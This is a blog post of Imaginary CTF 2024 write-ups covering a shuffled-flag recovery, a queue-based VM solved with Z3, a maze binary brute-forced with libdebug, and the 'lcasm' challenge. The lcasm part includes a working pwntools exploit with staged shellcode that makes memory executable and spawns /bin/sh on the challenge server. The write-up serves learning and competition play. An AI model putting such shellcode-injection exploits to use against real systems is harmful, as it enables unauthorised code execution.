---
title: Imaginary CTF 2024 - writeups
slug: imaginaryctf-2024-writeup
published: 2024-07-28
tags: [LCG, VM, OCaml, pwn, crypto, rev, CTF, writeup]
category: CTF writeups
description: writeups for lcasm, SVM revenge, and Oh, a Camel!
---

# Imaginary CTF 2024 - writeups

## Introduction

I played Imaginary CTF 2024, and I solved some challenges.
I played with L3ak and we got 3rd place!

I don't have much time to write this, so I'll just get to the point.
I solved some challenges:
- SVM revenge (rev)
- lcasm (crypto) with some pwn
- Oh, a Camel! (rev)

## But before that, a partial solution on forensics/elf in front of a sunset

My teammates were working on the challenge and got some decompilation

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

int main()
{
    uint64_t random; // rbx
    size_t len;      // rax
    char curr;       // [rsp+7h] [rbp-49h]
    int i;           // [rsp+8h] [rbp-48h]
    char s[40];      // [rsp+10h] [rbp-40h] BYREF
    uint64_t v9;     // [rsp+38h] [rbp-18h]

    strcpy(s, "_{f2isfsatutflwa_nh2}__asitib1leefwcuk");
    srand(0x123123Du);
    for (i = 0; i < strlen(s); ++i)
    {
        curr = s[i];
        random = rand();
        len = strlen(s);
        s[i] = s[(int)(random % len)];
        s[(int)(random % len)] = curr;
    }
    puts(s);
    return 0LL;
}
```

It looked like the flag was shuffled, and we needed to unshuffle it.
From what I learned in the past, if you permute a finite set of elements, you can always get back to the original order
by applying the permutation multiple times.

So, I updated the code to keep permuting until the flag was back to the original order.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>

int main()
{
	uint64_t random;
	size_t len;
	char curr;
	int i;
	char s[40];
	uint64_t v9;

	strcpy(s, "_{f2isfsatutflwa_nh2}__asitib1leefwcuk");
	while (true) {
		srand(0x123123Du);
		for (i = 0; i < strlen(s); ++i)
		{
			curr = s[i];
			random = rand();
			len = strlen(s);
			s[i] = s[(int)(random % len)];
			s[(int)(random % len)] = curr;
		}
		if (0 == strncmp(s, "ictf{", 5) && s[strlen(s) - 1] == '}') {
			puts(s);
			break;
		}
	}
	return 0LL;
}
```

This printed the flag, and I submitted it. Can't take too much credit because I know there are other parts to this,
such as reconstructing the ELF file.

## rev/SVM revenge

This was a VM challenge. I don't know anything about SVM, but it seemed like it was a challenge that involves a stack data structure.
However, don't be fooled! This challenge is actually a challenge that involves a queue data structure.

In this challenge, the queue was implemented using a linked list.

I used this definition for the linked list node:
```c
typedef struct __queue_ll_node {
    char val;
    struct queue_ll* next;
} queue_ll;
```

Then we can see the push and pop functions (renamed, of course):
```
00001189  queue_ll** qll_push(queue_ll** front, char val)
0000119f      queue_ll* rax_1 = malloc(bytes: 0x10)
000011b0      rax_1->val.b = val
000011b6      rax_1->next = nullptr
000011b6      
000011c9      if (front[1] == 0)
000011e5          *front = rax_1
000011c9      else
000011cf          front[1]->next = rax_1
000011cf      
000011f0      front[1] = rax_1
000011f6      return front

000011f7  uint64_t qll_pop(queue_ll** front)
00001207      queue_ll* rax_1 = *front
00001215      uint32_t rax_4 = zx.d(rax_1->val.b)
00001227      *front = rax_1->next
00001227      
00001234      if (*front == 0)
0000123a          front[1] = 0
0000123a      
00001249      free(mem: rax_1)
00001252      return zx.q(rax_4)
```

The main execution loop is as follows:
```
00001253  uint64_t execute(char* regs, int32_t opcode, int32_t operand)
00001262      uint64_t result = zx.q(operand)
00001264      char val = result.b
00001264      
0000126b      if (opcode u<= 5)
0000128f          result = sx.q(jump_table_2004[zx.q(opcode)]) + &jump_table_2004
0000128f          
00001292          switch (result)
000012b2              case 0x1294  // case 2
000012b2                  return qll_push(front: &regs[0x28], val: regs[sx.q(zx.d(val))])
000012cd              case 0x12bc  // case 5
000012cd                  return qll_push(front: &regs[0x28], val)
000012f7              case 0x12d7  // case 4
000012f7                  result = sx.q(zx.d(val))
000012f9                  regs[result] = qll_pop(front: &regs[0x28])
0000130c              case 0x1301  // case 3
0000130c                  char rax_14 = qll_pop(front: &regs[0x28])
00001341                  return qll_push(front: &regs[0x28], val: qll_pop(front: &regs[0x28]) + rax_14)
0000138d              case 0x1348  // case 1
0000138d                  return qll_push(front: &regs[0x28], val: qll_pop(front: &regs[0x28]) * qll_pop(front: &regs[0x28]))
0000138d      
00001395      return result
```

The comments are added by me to make it easier to understand, and so we can see the opcodes and their corresponding operations.
The program data was stored at file offset 0x4060, so I loaded the data and started reversing the program.

The program takes our input from the file *flag.txt* and processes it. The output is then placed in *encoded.bin*.

But because we're reversing, we need to solve the challenge in reverse. We need to find the input that will produce the output *encoded.bin*, which was given to us.

Implementing the VM in Python was easy, and I just used Z3 to solve the constraints.

```python
from z3 import *

prog = b'' # EXERCISE: load the program data and place it here lol

flag_chars = [BitVec('flag_{%d}' % i, 8) for i in range(0x10)]

regs = [0] * 0x30 # this many regs is more than enough

def qll_push_reg(reg_idx):
	queue.append(regs[reg_idx])

def qll_push_imm(val):
	queue.append(val)

def qll_pop(reg_idx): # pop value and save to reg
	regs[reg_idx] = queue.pop(0) & 0xff

def add():
	queue.append(queue.pop(0) + queue.pop(0))

def mul():
	queue.append(queue.pop(0) * queue.pop(0))

def execute(opcode, operand):
	match opcode:
		case 1:
			mul()
		case 2:
			qll_push_reg(operand)
		case 3:
			add()
		case 4:
			qll_pop(operand)
		case 5:
			qll_push_imm(operand)

def decode(prog: bytes):
	for i in range(0, len(prog), 2):
		opcode = prog[i]
		operand = prog[i + 1]
		if opcode == 0:
			return
		execute(opcode, operand)

flag = ''
with open('enc.bin', 'rb') as f: # NOTE: I placed the encoded data in enc.bin
	for i in range(4):
		expected = f.read(0x10)
		
		queue = [flag_chars[i] for i in range(0x10)]

		decode(prog)

		s = Solver()
		for i in range(0x10):
			s.add(queue[i] == expected[i])

		s.check()
		m = s.model()
		for i in range(0x10):
			flag += chr(m[flag_chars[i]].as_long())

print(flag)
```

## crypto/lcasm

The challenge was a crypto challenge that involved crafting a custom LCG that would generate 16 8-byte numbers.
The numbers are placed in an mmaped region, and the program will then execute the code in that region.

Note that before the code is executed, the program will change the protection of the memory region to be executable and read-only.

There is a trivial solution in creating an LCG if you only need to generate **two** numbers.

The formula for an LCG is `x_1 = (a * x_0 + c) % m`, where `a` is the multiplier, `c` is the increment, and `m` is the modulus.
`x_0` is the seed, and `x_1` is the next number.

In this program, note that the seed is not the first number generated by the LCG. Instead, `x_1` is the first number generated by the LCG.

Now that we know we create an LCG for basically 16 bytes, it's time to decide on what shellcode to execute in those 16 bytes.

I decided to make that shellcode be a stage 1 shellcode that would revert the *mprotect* changes and then read from stdin again,
allowing me to place a stage 2 shellcode in the memory region.

The stage 1 shellcode is as follows:

```asm
push   rax
pop    rdx
mov    al,0xa
mov    dl,0x7
syscall
push   rsi
pop    rdx
push   rdi
pop    rsi
push   rax
pop    rdi
syscall
```

The `mov` and `syscall` instructions are two bytes each, and the `push` and `pop` instructions are one byte each.

Optimizations:

- reuse as much of the existing registers as possible
- exchange the register values to the correct registers using `push` and `pop`

What the shellcode does is:
- mprotect the memory region to be readable, writable, and executable
- read from stdin using the entire memory region as the buffer

Then the stage 2 shellcode is a NOP-padded shellcode that will execute `/bin/sh`.

Now the only thing left is to create the LCG and generate the numbers, which is not that hard.
Then I went to writing the exploit.

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./lcasm')

wee = '''b *0x0000555555555410
c
'''

ngee = b"\x50\x5A\xB0\x0A\xB2\x07\x0F\x05\x56\x5A\x57\x5E\x50\x5F\x0F\x05"

arr = [
        # u64(bytes(ngee)[i:i+8]) for i in range(0, len(ngee), 8)
        u64(ngee[i:i+8]) for i in range(0, len(ngee), 8)
]

print(arr)

base = 0x7ffff7fbc000 # set this to whatever region is used to mmap. this should only be necessary when debugging
for i in range(len(ngee)):
    wee += 'set *(unsigned char *)' + hex(base + i) + ' = ' + f'{ngee[i]}\n'

print(wee)

# io = gdb.debug([elf.path], aslr=False) # , gdbscript=wee)
io = remote('lcasm.chal.imaginaryctf.org', 1337)

cs = lambda ntr: str(ntr).encode()

a = cs(1)
c = cs(96337519902726)
m = cs(18446744073709551615)
x = cs(364422218585299530)

io.sendlineafter(b'x> ', x)
io.sendlineafter(b'a> ', a)
io.sendlineafter(b'c> ', c)
io.sendlineafter(b'm> ', m)

sc = b''.join(map(p8, [0x6A, 0x42, 0xEB, 0x04, 0x00, 0x00, 0x00, 0x00, 0x58, 0xEB, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xC4, 0xEB, 0x04, 0x00, 0x00, 0x00, 0x00, 0x48, 0x99, 0xEB, 0x04, 0x00, 0x00, 0x00, 0x00, 0x52, 0xEB, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBF, 0x2F, 0x73, 0x68, 0x00, 0xEB, 0x01, 0x00, 0x48, 0xC1, 0xE7, 0x10, 0xEB, 0x02, 0x00, 0x00, 0x66, 0x81, 0xCF, 0x69, 0x6E, 0xEB, 0x01, 0x00, 0x48, 0xC1, 0xE7, 0x10, 0xEB, 0x02, 0x00, 0x00, 0x66, 0x81, 0xCF, 0x2F, 0x62, 0xEB, 0x01, 0x00, 0x57, 0xEB, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0xEB, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5E, 0xEB, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x89, 0xD0, 0xEB, 0x03, 0x00, 0x00, 0x00, 0x49, 0x89, 0xD2, 0xEB, 0x03, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xEB, 0x04, 0x00, 0x00, 0x00, 0x00]))

sc = b'\x90' * len(ngee) + sc

io.send(sc)
io.interactive()
```

## rev/Oh, a Camel!

This was a very clutch solve. I was able to solve this challenge within the last 5 minutes of the competition.
We were given a program, *main.exe*, that would read from stdin and print some stuff depending on the input.
Turns out that the program is a maze puzzle, and the input is the path to solve the maze.
If the path is correct, the program will print the flag, using the solution as the key to calculate the flag.

For this program, it is easy to test what characters are allowed in the input.

```
# ./main.exe
As you pick up the scroll, the ground starts shaking! What is the path you'll take to leave the pyramid? A
You seem to have lost your sense of direction and have no idea what to do.
# ./main.exe
As you pick up the scroll, the ground starts shaking! What is the path you'll take to leave the pyramid? D
Wandering through the pyramid, you realise that you don't know where you are. All corridors look exactly the same...
```

In this case, `A` is not allowed and `D` is allowed.

Going through all the characters, I found that `LRUD` are allowed.

I then needed to look further into the program if we can do some kind of cheese solution.

My teammate, yqroo, noted that there is a point in execution where we can tell if we were on a walkable path or not.
Consider a maze with walls and paths. If we ever try to walk out of bounds or hit a wall, there is a state that we can detect.

```
000865f0  call    camlStdlib__Bytes__fold_left_270
000865f5  movzx   rbx, byte [rax-0x8]
000865fa  test    rbx, rbx
000865fd  je      0x86604
```

Right before `test rbx, rbx`, we can observe the RBX register. If RBX is 0, then we are on a walkable path. Otherwise, we are not.

To solve the maze, we can use a depth-first search algorithm to find the path to the exit.
Another teammate tried to solve the maze using qiling, but it was too slow.

That's when I was reminded of a conversation I eavesdropped back in June 22 of this month.
JoshL, a friend of mine, had a talk with the creator of [libdebug](https://github.com/libdebug/libdebug), JinBlack.
I was sold from their conversation that libdebug is a good tool to use for debugging.

So I gave libdebug a try. Turns out that it uses `ptrace` to debug the program, and it was fast enough to try out a lot of paths.

```python
from libdebug import debugger

def test(inp: bytes):
    d = debugger('./main.exe', aslr=False)
    io = d.run()
    rbx = 1
    def save_rbx(t, bp):
        global rbx
        print(t.regs.rbx)
        rbx = t.regs.rbx
    d.breakpoint(0x5555555da5fa)
    d.cont()
    io.recvuntil(b"As you pick up the scroll, the ground starts shaking! What is the path you'll take to leave the pyramid? ")
    io.sendline(inp)
    d.wait()
    rbx = d.regs.rbx
    d.cont()
    d.wait()
    found = False
    output = io.recv() 
    if b'exactly the same' not in output:
        print(output) # flag found, probably
        found = True
    d.kill()
    return rbx, found

visited = set()

def dfs(start):
    # this is a gamble, but we're not going back to where we've been
    start = start.replace(b'RL', b'')
    start = start.replace(b'LR', b'')
    start = start.replace(b'DU', b'')
    start = start.replace(b'UD', b'')
    if start in visited:
        return
    visited.add(start)
    result = test(start)
    arr = []
    # try exploring in orthogonal directions first
    # then the same direction
    # then the opposite direction (but it get's cancelled out anyway)
    if start[-1] == b'R'[0]:
        arr = [b'U', b'D', b'R', b'L']
    if start[-1] == b'L'[0]:
        arr = [b'U', b'D', b'L', b'R']
    if start[-1] == b'U'[0]:
        arr = [b'L', b'R', b'U', b'D']
    if start[-1] == b'D'[0]:
        arr = [b'L', b'R', b'D', b'U']
    for c in arr:
        new_inp = start + c
        result = test(new_inp)
        if result[1]:
            print('found solution', new_inp)
            exit()
        elif result[0] == 0:
            print('cur_node', new_inp)
            dfs(new_inp)

dfs(b'R')

# for testing purposes
# print(test(b'L'))
# print(test(b'D'))
# print(test(b'U'))
# print(test(b'R'))
```

It takes some time to find the solution (it's a matter of minutes), but it's a good enough solution to solve the challenge.
In case you have your doubts that this actually solves, here is the last two lines of the output:

```
b"You safely reach the exit and finally have a moment to look at the contents of the scroll you've found: ictf{b3w4r3_0f_tr34ch3r0u5_d353rt5_4nd_t4gg3d_1nt3g3r5!}\n"
found solution b'RRDDDDDDDDRRDDRRDDRRRRRRDDRRRRRRRRDDRRRRRRRRDDRRDDRRRRRRDDDDDDDDRRDDDDDDDDDDDDRRRRDDLLLLDDRRDDRRDDDDRRDDRRDDRRRRDDDDDDRRRRRRDDRRDDRRRRRR'
```

## Conclusion

This was a fun CTF, and I enjoyed playing it. I hope to play more of Imaginary CTF in the future.
L3ak's admins gave me a shoutout for solving some good challenges, and I'm happy to have played with them.

I hope you enjoyed reading this writeup. I'll see you in the next CTF! or when I have time to write another post.
